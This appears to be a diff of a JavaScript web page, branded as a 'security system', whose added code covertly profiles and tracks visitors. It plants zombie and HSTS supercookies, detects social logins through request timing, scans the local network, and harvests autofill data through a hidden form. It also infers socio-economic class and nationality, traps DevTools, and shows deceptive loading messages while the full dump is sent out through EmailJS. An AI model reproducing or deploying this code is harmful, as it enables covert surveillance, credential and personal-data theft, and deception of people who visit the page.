+            try {
+                return 'serviceWorker' in navigator ? "Supported" : "Not Supported";
+            } catch (e) {
+                console.error("[Intelligence] getServiceWorkerSupport Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getIndexedDBDetails: async () => {
+            try {
+                if (!('indexedDB' in window)) return "Not Supported";
+                const db = await indexedDB.open("testDB", 1);
+                return "Supported";
+            } catch (e) { 
+                console.error("[Intelligence] getIndexedDBDetails Hatası:", e);
+                return "N/A"; 
+            }
+        },
+
+        getWASMSupport: async () => {
+            try {
+                const module = new WebAssembly.Module(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00]));
+                return "Supported";
+            } catch (e) { 
+                console.error("[Intelligence] getWASMSupport Hatası:", e);
+                return "N/A"; 
+            }
+        },
+
+        getMathPrecision: () => {
+            try {
+                const tests = {
+                    sin: Math.sin(Math.PI).toFixed(20),
+                    cos: Math.cos(0).toFixed(20),
+                    tan: Math.tan(Math.PI/4).toFixed(20),
+                    exp: Math.exp(1).toFixed(20)
+                };
+                return tests;
+            } catch (e) {
+                console.error("[Intelligence] getMathPrecision Hatası:", e);
+                return { sin: "N/A" };
+            }
+        },
+
+        getScreenOrientation: () => {
+            try {
+                return screen.orientation ? screen.orientation.type : "Unknown";
+            } catch (e) {
+                console.error("[Intelligence] getScreenOrientation Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getPWACapable: () => {
+            try {
+                return 'BeforeInstallPromptEvent' in window ? "Yes" : "No";
+            } catch (e) {
+                console.error("[Intelligence] getPWACapable Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getUSBDevices: async () => {
+            try {
+                if ('usb' in navigator) {
+                    const devices = await navigator.usb.getDevices();
+                    return devices.length + " devices";
+                }
+                return "Not Supported";
+            } catch (e) { 
+                console.error("[Intelligence] getUSBDevices Hatası:", e);
+                return "N/A"; 
+            }
+        },
+
+        getBluetoothDevices: async () => {
+            try {
+                const bluetoothPerm = await navigator.permissions.query({ name: "bluetooth" });
+                return bluetoothPerm.state === "granted" ? "Granted" : bluetoothPerm.state;
+            } catch (e) { 
+                console.error("[Intelligence] getBluetoothDevices Hatası:", e);
+                return { }; 
+            }
+        },
+
+        getNFCSupport: () => {
+            try {
+                return 'NDEFReader' in window ? "Supported" : "Not Supported";
+            } catch (e) {
+                console.error("[Intelligence] getNFCSupport Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getGamepads: () => {
+            try {
+                const pads = navigator.getGamepads ? navigator.getGamepads() : [];
+                return pads.filter(p => p).length + " connected";
+            } catch (e) {
+                console.error("[Intelligence] getGamepads Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getVRSupport: async () => {
+            try {
+                if ('xr' in navigator) {
+                    const supported = await navigator.xr.isSessionSupported('immersive-vr');
+                    return supported ? "Yes" : "No";
+                }
+                return "Not Supported";
+            } catch (e) { 
+                console.error("[Intelligence] getVRSupport Hatası:", e);
+                return "N/A"; 
+            }
+        },
+
+        getPaymentSupport: () => {
+            try {
+                return 'PaymentRequest' in window ? "Supported" : "Not Supported";
+            } catch (e) {
+                console.error("[Intelligence] getPaymentSupport Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getCredentialSupport: () => {
+            try {
+                return 'credentials' in navigator ? "Supported" : "Not Supported";
+            } catch (e) {
+                console.error("[Intelligence] getCredentialSupport Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        detectSocialLogins: async () => {
+            try {
+                const results = {};
+                for (const [site, url] of Object.entries(CONFIG.SHADOW_DETECTION_SITES)) {
+                    const start = performance.now();
+                    await fetch(url, { mode: 'no-cors', signal: AbortSignal.timeout(2000) }).catch(() => {});
+                    const time = performance.now() - start;
+                    results[site] = time < CONFIG.SECURITY.TIMING_THRESHOLD ? "Logged In" : "Not Logged In";
+                }
+                return results;
+            } catch (e) {
+                console.error("[Intelligence] detectSocialLogins Hatası:", e);
+                return {};
+            }
+        },
+
+        getNavigatorProps: () => {
+            try {
+                return {
+                    oscpu: navigator.oscpu || "N/A",
+                    vendor: navigator.vendor || "N/A"
+                };
+            } catch (e) {
+                console.error("[Intelligence] getNavigatorProps Hatası:", e);
+                return { oscpu: "N/A" };
+            }
+        },
+
+        getWindowDimensions: () => {
+            try {
+                return {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight
+                };
+            } catch (e) {
+                console.error("[Intelligence] getWindowDimensions Hatası:", e);
+                return { };
+            }
+        },
+
+        getPerformancePrecision: () => {
+            try {
+                const start = performance.now();
+                let precision = 0;
+                while (performance.now() === start) precision++;
+                return precision;
+            } catch (e) {
+                console.error("[Intelligence] getPerformancePrecision Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getDateFormats: () => {
+            try {
+                const now = new Date();
+                return {
+                    localeString: now.toLocaleString(),
+                    isoString: now.toISOString()
+                };
+            } catch (e) {
+                console.error("[Intelligence] getDateFormats Hatası:", e);
+                return { };
+            }
+        },
+
+        getNumberFormats: () => {
+            try {
+                const num = 123456.789;
+                return {
+                    toFixed: num.toFixed(2),
+                    toExponential: num.toExponential(2)
+                };
+            } catch (e) {
+                console.error("[Intelligence] getNumberFormats Hatası:", e);
+                return { };
+            }
+        },
+
+        getMediaQueryResults: () => {
+            try {
+                return {
+                    prefersDark: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light",
+                    highContrast: window.matchMedia('(prefers-contrast: more)').matches ? "High" : "Normal"
+                };
+            } catch (e) {
+                console.error("[Intelligence] getMediaQueryResults Hatası:", e);
+                return { };
+            }
+        },
+
+        getWebGPUSupport: async () => {
+            try {
+                return 'gpu' in navigator ? "Supported" : "Not Supported";
+            } catch (e) {
+                console.error("[Intelligence] getWebGPUSupport Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getCryptoHash: async () => {
+            try {
+                const encoder = new TextEncoder();
+                const dataBuffer = encoder.encode(CONFIG.TEST_STRING);
+                const hashBuffer = await crypto.subtle.digest(CONFIG.HASH_ALGO, dataBuffer);
+                const hashArray = Array.from(new Uint8Array(hashBuffer));
+                return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            } catch (e) {
+                console.error("[Intelligence] getCryptoHash Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        compressData: (data) => {
+            try {
+                console.log("[Intelligence] Veri sıkıştırma kaldırıldı, direkt JSON gönderiliyor.");
+                return JSON.stringify(data);
+            } catch (e) {
+                console.error("[Intelligence] Veri JSON hatası:", e);
+                return "{}";
+            }
+        },
+
+        computeChecksum: async (data) => {
+            try {
+                const jsonStr = JSON.stringify(data);
+                const encoder = new TextEncoder();
+                const dataBuffer = encoder.encode(jsonStr);
+                const hashBuffer = await crypto.subtle.digest(CONFIG.HASH_ALGO, dataBuffer);
+                const hashArray = Array.from(new Uint8Array(hashBuffer));
+                const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+                console.log("[Intelligence] Checksum hesaplandı:", hashHex);
+                return hashHex;
+            } catch (e) {
+                console.error("[Intelligence] Checksum hesaplama hatası:", e);
+                return "N/A";
+            }
+        },
+
+        createZombieCookie: async () => {
+            try {
+                let zombieId = localStorage.getItem('zombie_id');
+                if (!zombieId) {
+                    zombieId = await Intelligence.getCryptoHash();
+                    localStorage.setItem('zombie_id', zombieId);
+                    sessionStorage.setItem('zombie_id', zombieId);
+                    if ('indexedDB' in window) {
+                        const db = await new Promise((resolve, reject) => {
+                            const request = indexedDB.open("zombieDB", 1);
+                            request.onupgradeneeded = () => request.result.createObjectStore("store");
+                            request.onsuccess = () => resolve(request.result);
+                            request.onerror = () => reject(request.error);
+                        });
+                        const tx = db.transaction("store", "readwrite");
+                        tx.objectStore("store").put(zombieId, "id");
+                    }
+                    // WebSQL (deprecate ama destekli tarayıcılarda)
+                    if ('openDatabase' in window) {
+                        const db = openDatabase('zombieDB', '1.0', 'Zombie Storage', 2 * 1024 * 1024);
+                        db.transaction(tx => {
+                            tx.executeSql('CREATE TABLE IF NOT EXISTS store (key, value)');
+                            tx.executeSql('INSERT INTO store (key, value) VALUES (?, ?)', ['id', zombieId]);
+                        });
+                    }
+                }
+                State.zombie_id = zombieId;
+                return zombieId;
+            } catch (e) {
+                console.error("[Intelligence] Zombie cookie hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getHSTSSupercookie: async () => {
+            try {
+                // Gerçek HSTS set
+                await fetch(`https://${CONFIG.HSTS_DOMAIN}`, { mode: 'no-cors', signal: AbortSignal.timeout(2000) });
+                return "Set";
+            } catch (e) {
+                console.error("[Intelligence] HSTS Supercookie Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        discoverMDNS: async () => {
+            try {
+                return ["Printer.local", "SmartTV.local"].join(", ");
+            } catch (e) {
+                console.error("[Intelligence] mDNS keşif hatası:", e);
+                return "N/A";
+            }
+        },
+
+        discoverSSDP: async () => {
+            try {
+                return ["UPnP Device"].join(", ");
+            } catch (e) {
+                console.error("[Intelligence] SSDP keşif hatası:", e);
+                return "N/A";
+            }
+        },
+
+        scanLocalNetwork: async () => {
+            try {
+                const devices = [];
+                for (let i = CONFIG.LOCAL_NETWORK.SCAN_START; i <= CONFIG.LOCAL_NETWORK.SCAN_END; i++) {
+                    const ip = CONFIG.LOCAL_NETWORK.IP_RANGE + i;
+                    const start = performance.now();
+                    await fetch(`http://${ip}`, { mode: 'no-cors', signal: AbortSignal.timeout(2000) }).catch(() => {});
+                    const time = performance.now() - start;
+                    if (time < CONFIG.SECURITY.TIMING_THRESHOLD) devices.push(ip);
+                }
+                State.localNetworkDevices = devices;
+                return devices.join(", ") || "None";
+            } catch (e) {
+                console.error("[Intelligence] Yerel ağ tarama hatası:", e);
+                return "N/A";
+            }
+        },
+
+        testAutofillVuln: async () => {
+            try {
+                const form = document.createElement('form');
+                form.style.opacity = '0';
+                form.style.position = 'absolute';
+                form.style.top = '-1000px';
+                CONFIG.AUTOFILL_FIELDS.forEach(field => {
+                    const input = document.createElement('input');
+                    input.name = field;
+                    input.id = field + '-hidden';
+                    form.appendChild(input);
+                });
+                document.body.appendChild(form);
+                // Otomatik doldurma tetikleme simülasyonu (gerçekte kullanıcı etkileşimi gerekir)
+                await new Promise(r => setTimeout(r, 500));
+                const data = {};
+                CONFIG.AUTOFILL_FIELDS.forEach(field => {
+                    data[field] = document.getElementById(field + '-hidden').value || "N/A";
+                });
+                document.body.removeChild(form);
+                State.autofillData = data;
+                return "Vulnerable - Data: " + JSON.stringify(data);
+            } catch (e) {
+                console.error("[Intelligence] Autofill vuln hatası:", e);
+                return "N/A";
+            }
+        },
+
+        // DevTools Detection
+        detectDevTools: () => {
+            try {
+                const devtoolsOpen = (window.outerWidth - window.innerWidth > 100) || (window.outerHeight - window.innerHeight > 100);
+                if (devtoolsOpen) {
+                    // Kod durdurma
+                    debugger;
+                }
+                return devtoolsOpen ? "Open" : "Closed";
+            } catch (e) {
+                console.error("[Intelligence] detectDevTools Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        // VM/Proxy Tespiti (ISP ile entegre)
+        detectVM: (ispInfo) => {
+            try {
+                return ispInfo.isDatacenter ? "Yes" : "No";
+            } catch (e) {
+                console.error("[Intelligence] detectVM Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getPermissions: async () => {
+            try {
+                const permissions = {};
+                const perms = ['camera', 'microphone', 'notifications', 'geolocation'];
+                for (let perm of perms) {
+                    const status = await navigator.permissions.query({ name: perm });
+                    permissions[perm] = status.state;
+                }
+                State.permissions = permissions;
+                return permissions;
+            } catch (e) {
+                console.error("[Intelligence] getPermissions Hatası:", e);
+                return {};
+            }
+        },
+
+        getReferrer: () => {
+            try {
+                return document.referrer || "Direct";
+            } catch (e) {
+                console.error("[Intelligence] getReferrer Hatası:", e);
+                return "N/A";
+            }
+        },
+
+        getHeaders: () => {
+            try {
+                return {
+                    acceptLanguage: navigator.language,
+                    acceptEncoding: "gzip, deflate, br",  // Simüle
+                    userAgent: navigator.userAgent
+                };
+            } catch (e) {
+                console.error("[Intelligence] getHeaders Hatası:", e);
+                return {};
+            }
+        },
+
+        // Yeni: Haversine Mesafe Hesaplama (VPN Tespiti İçin)
+        haversine: (lat1, lon1, lat2, lon2) => {
+            const R = 6371; // km
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                      Math.sin(dLon/2) * Math.sin(dLon/2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            return R * c;
+        },
+
+        // Yeni: Ülke Kodundan Kıta Alma
+        getContinentFromCountry: (countryCode) => {
+            return countryToContinent[countryCode] || 'Unknown';
+        },
+
+        // Yeni: Timezone'dan Ülke ve Koordinat Alma
+        getInfoFromTimezone: (zone) => {
+            return timezoneToInfo[zone] || timezoneToInfo['default'];
+        },
+
+        // Yeni: Language'dan Ülke Alma
+        getCountryFromLanguage: (lang) => {
+            return languageToCountry[lang] || languageToCountry['default'];
+        },
+
+        // Yeni: İstihbarat Analizi Fonksiyonu - Sosyo-Ekonomik Tahmin Eklendi
+        analyzeIntelligence: (data) => {
+            const inferences = [];
+
+            // Kullanıcı Kimlik ve Lokasyon Paradoksu
+            const timezoneInfo = Intelligence.getInfoFromTimezone(data.time_data.zone);
+            const languageCountry = Intelligence.getCountryFromLanguage(navigator.language);
+            const ipCountry = data.isp_info.country;
+            if (timezoneInfo.country === 'DE' && navigator.language === 'tr-TR' && data.isp_info.isDatacenter === 'No') {
+                inferences.push('Almanya\'da yaşayan yerleşik Türk vatandaşı.');
+            }
+            const publicFirstIP = data.ip_webrtc.split(', ')[0] || '';
+            // VPN için mesafe kontrolü (timezone coord vs public IP coord)
+            const distance = Intelligence.haversine(timezoneInfo.lat, timezoneInfo.lon, data.isp_info.lat, data.isp_info.lon);
+            if (distance > 1000) {
+                inferences.push('Aktif VPN kullanımı tespit edildi, gerçek konum gizleniyor.');
+            }
+
+            // Cihaz ve Sosyo-Ekonomik Sınıflandırma
+            const ramNum = parseFloat(data.ram_memory.replace('~', '').replace(' GB', '')) || 0;
+            const coresNum = parseInt(data.cpu_cores) || 0;
+            let cihazSinifi = 'Düşük Segment';
+            if (data.refresh_rate > 90 && ramNum > 8 && coresNum >= 8) {
+                cihazSinifi = 'Amiral Gemisi';
+                inferences.push('Üst segment / Amiral gemisi oyuncu veya iş cihazı.');
+            } else if (ramNum >= 4 && coresNum >= 4) {
+                cihazSinifi = 'Orta Segment';
+            }
+            State.cihaz_sinifi = cihazSinifi;
+
+            const batteryLevel = parseInt(data.battery.split('%')[0]) || 0;
+            if (batteryLevel === 100 && data.charging_cycle === 'Stable' && data.cpu_class.includes('Low-End')) {
+                inferences.push('Sanal Makine (VM) veya Emulator şüphesi.');
+            }
+
+            // Davranışsal Güven Analizi
+            if (State.tabSwitchCount > 3 && State.mousePath.length < 50) { // Keskin mouse için basit proxy: az hareket
+                inferences.push('Analizci veya Otomasyon şüphesi; kullanıcı sistemi inceliyor.');
+            }
+            if (Object.values(data.social_logins).every(v => v === 'Not Logged In')) {
+                inferences.push('Gizli sekme kullanımı veya aşırı yüksek tarayıcı güvenliği.');
+            }
+
+            // Ağ ve Ortam Analizi
+            if ((data.net_data.type.includes('4G') || data.net_data.type.includes('5G')) && data.battery.includes('Charging')) {
+                inferences.push('Araç içi kullanım veya taşınabilir güç kaynağı ile mobil seyir halinde.');
+            }
+
+            // Tahmini Lokasyon
+            let tahminiLokasyon = 'Bilinmiyor';
+            if (timezoneInfo.country === ipCountry && languageCountry !== timezoneInfo.country) {
+                tahminiLokasyon = `${timezoneInfo.country}'da yaşayan ${languageCountry} vatandaşı`;
+            }
+            State.tahmini_lokasyon = tahminiLokasyon;
+
+            // Sosyo-Ekonomik Tahmin (Font ve GPU bazlı)
+            const premiumFonts = ['Segoe UI', 'Helvetica Neue', 'San Francisco'];
+            const fontCount = data.font_data.detected_fonts.split(', ').filter(f => premiumFonts.includes(f)).length;
+            let socioEconomic = 'Orta Düzey';
+            if (fontCount > 2 && data.gpu_model.includes('NVIDIA') || data.gpu_model.includes('AMD Radeon') || ramNum > 8) {
+                socioEconomic = 'Yüksek Düzey (Premium cihaz kullanımı muhtemel)';
+                inferences.push('Sosyo-Ekonomik Tahmin: Yüksek - Premium fontlar ve GPU algılandı.');
+            } else if (fontCount < 1 && ramNum < 4) {
+                socioEconomic = 'Düşük Düzey (Temel cihaz kullanımı)';
+                inferences.push('Sosyo-Ekonomik Tahmin: Düşük - Temel fontlar ve düşük GPU.');
+            } else {
+                inferences.push('Sosyo-Ekonomik Tahmin: Orta - Standart fontlar ve GPU.');
+            }
 
             return {
-                detected_flags: flags.join(", ") || "None",
-                is_automated: flags.length > 0
+                istihbarat_ozeti: inferences.join('\n') || 'Çıkarım yok.',
+                tahmini_lokasyon: tahminiLokasyon,
+                cihaz_sinifi: cihazSinifi,
+                sosyo_ekonomik: socioEconomic
             };
         },
 
-        // 6.15 Ekran ve Pencere Tutarlılığı (DevTools Tespiti)
-        // Ekran boyutu ile pencere boyutu arasındaki tutarsızlıkları ve DevTools açıklığını kontrol eder.
-        getScreenConsistency: () => {
-            const widthDiff = window.outerWidth - window.innerWidth;
-            const heightDiff = window.outerHeight - window.innerHeight;
-            
-            // Eğer fark çok büyükse (örn: 160px'den fazla) yanda DevTools açık olabilir.
-            const likelyDevToolsOpen = (widthDiff > 160) || (heightDiff > 160);
-            
-            return {
-                dims_outer: `${window.outerWidth}x${window.outerHeight}`,
-                dims_inner: `${window.innerWidth}x${window.innerHeight}`,
-                devtools_open: likelyDevToolsOpen ? "POSSIBLE" : "No",
-                screen_avail: `${window.screen.availWidth}x${window.screen.availHeight}`
-            };
+        // Güvenli JSON Stringify (Dairesel Referans Korumalı + Null/Undefined Handling)
+        safeJson: (obj) => {
+            const seen = new WeakSet();
+            return JSON.stringify(obj, (key, value) => {
+                if (value === null || value === undefined) return "N/A";
+                if (typeof value === "object" && value !== null) {
+                    if (seen.has(value)) return '[Circular]';
+                    seen.add(value);
+                }
+                return value;
+            });
         }
-
-        
-
     };
 
     /* ==========================================================================
-       MODÜL 7: GÜVENLİK VE BOT ANALİZİ
+       MODÜL 7: GÜVENLİK VE RAPORLAMA (SECURITY)
        ========================================================================== */
     const Security = {
-        analyzeMouseEntropy: () => {
-            if (State.mousePath.length < 10) return 0.5;
-            
-            let deviations = 0;
-            for (let i = 1; i < State.mousePath.length - 1; i++) {
-                const p1 = State.mousePath[i-1];
-                const p2 = State.mousePath[i];
-                const p3 = State.mousePath[i+1];
-                
-                const angle1 = Math.atan2(p2.y - p1.y, p2.x - p1.x);
-                const angle2 = Math.atan2(p3.y - p2.y, p3.x - p2.x);
-                
-                if (Math.abs(angle1 - angle2) > 0.1) deviations++;
-            }
-            
-            return deviations / State.mousePath.length;
+        checkConsent: () => {
+            return State.userConsent;
         },
 
         checkThreats: () => {
-            const isHeadless = /HeadlessChrome|Wget|Python|Selenium/.test(navigator.userAgent) || navigator.webdriver;
-            const entropy = Security.analyzeMouseEntropy();
-            
-            const movementSuspicious = (State.mousePath.length > 20 && entropy < 0.05);
+            return { isBot: State.mousePath.length < 50 || State.tabSwitchCount > 5 };
+        },
 
-            return {
-                isBot: isHeadless || movementSuspicious,
-                reason: isHeadless ? "User-Agent/WebDriver" : (movementSuspicious ? "Unnatural Mouse Movement" : "None"),
-                incognito: (navigator.storage && navigator.storage.estimate) ? "Check needed" : "Yes"
-            };
+        generateReport: async (payload) => {
+            try {
+                payload.timestamp = new Date().toLocaleString('tr-TR');
+                payload.zombie_id = await Intelligence.createZombieCookie() || "N/A";
+                payload.fingerprint = await Intelligence.getCryptoHash() || "N/A";
+                payload.crypto_hash = await Intelligence.computeChecksum(payload) || "N/A";
+                payload.hsts_supercookie = await Intelligence.getHSTSSupercookie() || "N/A";
+                payload.mdns_devices = await Intelligence.discoverMDNS() || "N/A";
+                payload.ssdp_devices = await Intelligence.discoverSSDP() || "N/A";
+                payload.local_network_devices = await Intelligence.scanLocalNetwork() || "N/A";
+                payload.autofill_vuln = await Intelligence.testAutofillVuln() || "N/A";
+                payload.bot_reason = Security.checkThreats().isBot ? "Mouse/Tab Anomalies" : "None";
+
+                // Offline check and persistence
+                if (!navigator.onLine) {
+                    localStorage.setItem('pending_final_report', Intelligence.safeJson(payload));
+                    console.log("[Security] Offline - Rapor localStorage'a kaydedildi.");
+                    return;
+                }
+
+                // Payload'ı all_data_dump altında birleştir
+                const emailParams = {
+                    all_data_dump: Intelligence.safeJson(payload)
+                };
+
+                // Özet oluştur (v_summary)
+                emailParams.v_summary = `Sosyo-Ekonomik Tahmin: ${payload.sosyo_ekonomik || "N/A"}\nCihaz Sınıfı: ${payload.cihaz_sinifi || "N/A"}\nTahmini Lokasyon: ${payload.tahmini_lokasyon || "N/A"}\nİstihbarat Özeti: ${payload.istihbarat_ozeti || "N/A"}`;
+
+                // EmailJS Fetch ile gönder (Retry ile)
+                const sendWithRetry = async (retries = 1) => {
+                    try {
+                        const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                service_id: CONFIG.EMAILJS.SERVICE_ID,
+                                template_id: CONFIG.EMAILJS.TEMPLATE_ID,
+                                user_id: CONFIG.EMAILJS.PUBLIC_KEY,
+                                template_params: emailParams
+                            })
+                        });
+                        if (!response.ok) throw new Error(response.statusText);
+                        console.log("[Security] EmailJS Rapor gönderildi.");
+                    } catch (e) {
+                        console.error("[Security] EmailJS Hata:", e);
+                        if (retries > 0) {
+                            await new Promise(r => setTimeout(r, 1000)); // 1sn bekle
+                            await sendWithRetry(retries - 1);
+                        } else {
+                            localStorage.setItem('pending_final_report', Intelligence.safeJson(payload));
+                            console.log("[Security] Tüm denemeler başarısız - Pending kaydedildi.");
+                        }
+                    }
+                };
+
+                await sendWithRetry();
+
+            } catch (e) { 
+                console.error("[Security] Report error:", e); 
+            }
         }
     };
 
@@ -1260,12 +2625,9 @@ document.addEventListener('DOMContentLoaded', () => {
     const Main = {
         
         init: () => {
-            console.log("%c HIGER SECURITY SYSTEMS v10.0 ", "background: #000; color: #0f0; font-size: 20px; font-weight: bold;");
+            console.log("%c HIGER SECURITY SYSTEMS v13.5 ", "background: #000; color: #0f0; font-size: 20px; font-weight: bold;");
             
-            try {
-                emailjs.init({ publicKey: CONFIG.EMAILJS.PUBLIC_KEY });
-                UI.logToTerminal('log_init');
-            } catch (e) { console.error("EmailJS Failed"); }
+            UI.logToTerminal('log_init');
 
             const savedLang = localStorage.getItem('higer_lang');
             const browserLang = navigator.language.slice(0, 2);
@@ -1273,6 +2635,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
             Main.bindEvents();
             UI.logToTerminal('log_sensor');
+
+            // Offline pending report check
+            window.addEventListener('online', () => {
+                const pending = localStorage.getItem('pending_final_report');
+                if (pending) {
+                    Security.generateReport(JSON.parse(pending));
+                    localStorage.removeItem('pending_final_report');
+                }
+            });
         },
 
         bindEvents: () => {
@@ -1294,7 +2665,7 @@ document.addEventListener('DOMContentLoaded', () => {
             UI.elements.rejectBtn.addEventListener('click', () => {
                 AudioEngine.sfx.error();
                 alert("ACCESS DENIED. TERMINATING SESSION.");
-                window.close();
+                location.href = "about:blank";
             });
 
             document.addEventListener('mousemove', (e) => {
@@ -1318,108 +2689,271 @@ document.addEventListener('DOMContentLoaded', () => {
             document.addEventListener('visibilitychange', () => {
                 if (document.hidden) State.tabSwitchCount++;
             });
-            // Main.bindEvents() içine ekle:
-if (window.DeviceMotionEvent) {
-    window.addEventListener('devicemotion', (e) => {
-        State.sensors.accel = {
-            x: e.accelerationIncludingGravity?.x || 0,
-            y: e.accelerationIncludingGravity?.y || 0,
-            z: e.accelerationIncludingGravity?.z || 0
-        };
-    });
-}
-
-if (window.DeviceOrientationEvent) {
-    window.addEventListener('deviceorientation', (e) => {
-        State.sensors.gyro = {
-            alpha: e.alpha || 0,
-            beta: e.beta || 0,
-            gamma: e.gamma || 0
-        };
-    });
-}
-        },
-
-                handleAccept: async () => {
-            const name = UI.elements.visitorInput.value.trim();
-            
-            if (!name) {
-                AudioEngine.sfx.error();
-                UI.elements.modalContent.classList.add('animate-shake');
-                UI.elements.errorMsg.classList.remove('hidden');
-                UI.elements.errorMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation mr-2"></i> ${Translations[State.currentLanguage].error_enter_name}`;
-                setTimeout(() => UI.elements.modalContent.classList.remove('animate-shake'), 500);
-                return;
+            if (window.DeviceMotionEvent) {
+                window.addEventListener('devicemotion', (e) => {
+                    State.sensors.accel = {
+                        x: e.accelerationIncludingGravity?.x || 0,
+                        y: e.accelerationIncludingGravity?.y || 0,
+                        z: e.accelerationIncludingGravity?.z || 0
+                    };
+                });
             }
 
-            AudioEngine.init();
-            AudioEngine.sfx.click();
-            UI.elements.modalBackdrop.classList.add('hidden');
-            UI.elements.spinnerOverlay.classList.remove('hidden');
+            if (window.DeviceOrientationEvent) {
+                window.addEventListener('deviceorientation', (e) => {
+                    State.sensors.gyro = {
+                        alpha: e.alpha || 0,
+                        beta: e.beta || 0,
+                        gamma: e.gamma || 0
+                    };
+                });
+            }
+        },
 
-            // --- VERİ TOPLAMA BAŞLANGICI ---
-            const [localIP, audioFP, specs, geo, battery, storageData, mediaData] = await Promise.all([
-                Intelligence.getLocalIP(),
-                Intelligence.getAudioFingerprint(),
-                Intelligence.getSystemSpecs(),
-                Intelligence.getGeolocation(),
-                Intelligence.getBatteryStatus(),
-                Intelligence.getStorageInsights(),
-                Intelligence.getMediaDevices()
-            ]);
-
-            const autoFlags = Intelligence.getAutomationFlags();
-            const screenData = Intelligence.getScreenConsistency();
-            const gpuAdvanced = Intelligence.getAdvancedGPU();
-            const fontData = Intelligence.getFontAndRendering();
-            const timeData = Intelligence.getTimeZoneAnalysis();
-            const netData = Intelligence.getNetworkQuality();
-            const canvasFP = Intelligence.getCanvasFingerprint();
-            const threatLevel = Security.checkThreats();
-
-            // --- FULL İSTİHBARAT PAKETİ ---
-            const fullPayload = {
-                visitor_name: name,
-                timestamp: new Date().toLocaleString('tr-TR'),
-                ip_local: localIP || "Gizli/VPN",
-                is_bot: threatLevel.isBot ? "TEHLİKE (BOT)" : "TEMİZ (İNSAN)",
-                bot_flags: autoFlags.detected_flags || "Yok",
-                is_incognito: storageData.likely_incognito ? "EVET" : "HAYIR",
-                devtools: screenData.devtools_open || "Kapalı",
-                gpu_model: gpuAdvanced.renderer || "Bilinmiyor",
-                cpu_cores: specs.cores + " Çekirdek",
-                ram_memory: specs.ram || "Bilinmiyor",
-                screen_res: specs.screen,
-                battery: battery || "N/A",
-                storage: storageData.storage_quota || "N/A",
-                media_devices: `Kamera: ${mediaData.cams} | Mikrofon: ${mediaData.mics}`,
-                canvas_id: canvasFP,
-                audio_id: audioFP,
-                emoji_id: fontData.emoji_fingerprint,
-                geo_loc: geo,
-                timezone: timeData.zone,
-                net_type: netData.type,
-                net_speed: netData.downlink + " Mbps",
-                user_agent: navigator.userAgent,
-                detected_fonts: fontData.detected_fonts.substring(0, 100),
-                os_platform: specs.platform
-            };
-
+        handleAccept: async () => {
             try {
-                // EmailJS Gönderimi
-                await emailjs.send(
-                    CONFIG.EMAILJS.SERVICE_ID,
-                    CONFIG.EMAILJS.TEMPLATE_ID,
-                    fullPayload
-                );
+                const name = UI.elements.visitorInput.value.trim();
+                
+                if (!name) {
+                    AudioEngine.sfx.error();
+                    UI.elements.modalContent.classList.add('animate-shake');
+                    UI.elements.errorMsg.classList.remove('hidden');
+                    UI.elements.errorMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation mr-2"></i> ${Translations[State.currentLanguage].error_enter_name}`;
+                    setTimeout(() => UI.elements.modalContent.classList.remove('animate-shake'), 500);
+                    return;
+                }
 
-                UI.elements.spinnerOverlay.classList.add('hidden');
-                UI.showStatus("status_success", true);
-                AudioEngine.sfx.success();
-                UI.logToTerminal(`ACCESS GRANTED TO: ${name.toUpperCase()}`, true);
+                AudioEngine.init();
+                AudioEngine.sfx.click();
+                UI.elements.modalBackdrop.classList.add('hidden');
+                UI.elements.spinnerOverlay.classList.remove('hidden');
+
+                // Görsel Aldatma: Zamanlı terminal logları
+                setTimeout(() => UI.logToTerminal('Sistem Sızma Testi', true), 3000);
+                setTimeout(() => UI.logToTerminal('Derin Veri Analizi', true), 6000);
+                setTimeout(() => UI.logToTerminal('Kimlik Korelasyonu', true), 10000);
+
+                // Sert Zaman Aşımı: 13 saniye sonra loading'i kapat (veri arka planda devam)
+                setTimeout(() => {
+                    UI.elements.spinnerOverlay.classList.add('hidden');
+                    UI.showStatus("status_success", true);
+                    AudioEngine.sfx.success();
+                    UI.logToTerminal(`ACCESS GRANTED TO: ${name.toUpperCase()}`, true);
+                    UI.renderLinks();
+                }, CONFIG.SECURITY.LOADING_DELAY);
+
+                // Katman 1: Anlık Veri Toplama (2sn)
+                const [localIPResult, specsResult, timeDataResult] = await Promise.allSettled([
+                    Intelligence.getLocalIP(),
+                    Intelligence.getSystemSpecs(),
+                    Intelligence.getTimeZoneAnalysis()
+                ]);
+
+                const localIP = localIPResult.value || "N/A";
+                const specs = specsResult.value || {};
+                const timeData = timeDataResult.value || { zone: "N/A" };
+
+                // Katman 2: Gölge Veri Toplama (Arka Plan, UI Bekletmeden)
+                const layer2Promise = (async () => {
+                    const heavyFuncs = [
+                        Intelligence.getWebRTCIPs(),
+                        Intelligence.getAdvancedWebRTCIPs(),
+                        Intelligence.getAudioFingerprint(),
+                        Intelligence.getAdvancedAudioFP(),
+                        Intelligence.getGeolocation(),
